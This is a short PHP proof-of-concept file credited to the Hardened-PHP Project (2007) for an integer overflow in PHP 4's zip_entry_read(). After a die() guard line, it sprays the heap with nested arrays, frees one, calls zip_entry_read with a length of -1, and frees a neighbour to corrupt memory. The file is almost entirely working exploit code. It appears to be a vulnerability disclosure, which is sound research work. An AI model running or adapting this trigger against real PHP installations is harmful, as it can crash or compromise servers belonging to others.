<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //        PHP 4 zip_entry_read() Integer Overflow Vulnerability       //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  $r = zip_open("x.zip");
  $e = zip_read($r);
  $x = zip_entry_open($r, $e);


  for ($i=0; $i<1000; $i++) $arr[$i]=array(array(""));
  unset($arr[600]);
  
  zip_entry_read($e, -1);
  
  unset($arr[601]);
?>